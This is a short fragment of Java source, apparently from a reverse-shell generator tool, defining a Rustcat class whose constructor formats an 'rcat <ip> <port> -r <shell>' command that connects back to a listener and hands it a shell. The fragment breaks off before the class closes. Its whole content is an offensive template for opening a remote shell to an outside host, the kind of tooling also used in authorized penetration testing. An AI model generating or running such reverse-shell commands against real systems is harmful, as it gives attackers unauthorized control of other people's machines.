...
public class Rustcat extends Reverse {

    protected String shellFormat = "";

    public Rustcat(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("rcat %s %s -r %s", this.getLocalIP(), this.getLocalPort(), this.getShell());
    }
